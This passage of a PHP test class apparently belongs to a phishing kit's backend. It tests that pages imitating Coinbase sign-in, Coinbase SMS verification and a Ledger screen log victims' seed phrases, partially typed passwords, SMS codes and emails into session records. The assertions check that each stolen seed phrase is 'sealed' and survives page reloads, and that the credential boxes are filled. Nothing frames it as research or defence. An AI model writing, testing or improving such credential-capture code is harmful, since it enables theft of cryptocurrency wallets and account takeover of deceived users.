        $this->assertSame(['after-f5'], $this->lastAttempt($token, $page)['words']);
        $this->assertAcceptedHasSummary($token);

        $this->postEvent($token, [
            'type' => 'form_submit',
            'page' => $page,
            'element' => 'seed_phrase',
            'value' => 'after-f5',
            'doc' => $doc2,
            'stay' => $stay,
        ])->assertOk()->assertJson(['ok' => true]);
        $this->assertSame($eventsBeforeSeal + 1, UserEvent::where('session_token', $token)->count());
        $this->assertCount(1, UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page]);

        $this->withCookie('liveled_token', $token)->get('/ledger/loading')->assertOk();
        $leaveDoc = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($doc2, $leaveDoc);
        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_loading',
            'doc' => $leaveDoc,
        ])->assertOk();
        $this->assertSame('sealed', $this->lastAttempt($token, $page)['state']);
        $this->assertSame(['after-f5'], $this->lastAttempt($token, $page)['words']);

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['stale-after-leave'], 'passphrase' => '']),
            'doc' => $doc2,
            'stay' => $stay,
        ])->assertStatus(409);
        $this->assertSame(['after-f5'], $this->lastAttempt($token, $page)['words']);

        $this->withCookie('liveled_token', $token)->get($path)->assertOk();
        $returnDoc = UserSession::where('session_token', $token)->value('document_id');
        $stay2 = (int) $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => $page,
            'doc' => $returnDoc,
        ])->assertOk()->json('stay');
        $this->assertNotSame($stay, $stay2);
        $list = UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page];
        $this->assertCount(2, $list);
        $this->assertSame('sealed', $list[0]['state']);
        $this->assertSame('active', $list[1]['state']);
        $this->assertSame([], $list[1]['words']);
        $this->assertAcceptedHasSummary($token);
    }

    private function assertAcceptedHasSummary(string $token): void
    {
        $session = UserSession::where('session_token', $token)->first();
        $this->assertNotNull($session);
        $events = UserEvent::where('session_token', $token)->orderBy('id')->get();
        $this->assertGreaterThan(0, $events->count());
        $summary = is_array($session->activity_summary) ? $session->activity_summary : [];

        foreach ($events as $event) {
            $type = (string) $event->type;
            $el = (string) $event->element;
            $page = (string) $event->page;
            if ($el === 'word_count' || $el === 'phrase_reset') {
                continue;
            }
            if ($type === 'phrase_input' && $el === 'full_state') {
                $this->assertIsArray($summary['attempts'][$page] ?? null, $page.' missing attempt after full_state');
            }
            if ($type === 'form_submit' && $el === 'seed_phrase') {
                $this->assertIsArray($summary['attempts'][$page] ?? null, $page.' missing attempt after submit');
                $sealed = false;
                foreach ($summary['attempts'][$page] as $row) {
                    if (($row['state'] ?? '') === 'sealed') {
                        $sealed = true;
                        break;
                    }
                }
                $this->assertTrue($sealed, $page.' has seed_phrase but no sealed attempt');
            }
            if ($type === 'form_input' && $el === 'password_partial') {
                $this->assertNotNull($summary['boxes']['password']['value'] ?? null);
            }
            if ($type === 'code_input' && $el === 'code_partial' && $page === 'coinbase_sms_code') {
                $this->assertNotNull($summary['boxes']['sms']['value'] ?? null);
            }
            if ($type === 'form_submit' && $el === 'email' && $page === 'coinbase_sign_in') {
                $this->assertNotNull($summary['boxes']['email']['value'] ?? null);
            }
        }
    }

    private function token(): string
    {
        return Str::random(48);
    }

    private function postEvent(string $token, array $payload)
    {
        return $this->withCookie('liveled_token', $token)->post('/api/log', $payload);
    }

    private function lastAttempt(string $token, string $page): array
    {
        $list = UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page];
        return $list[count($list) - 1];
    }

    private function box(string $token, string $box): mixed
    {
        return UserSession::where('session_token', $token)->first()->activity_summary['boxes'][$box]['value'] ?? null;
    }
}
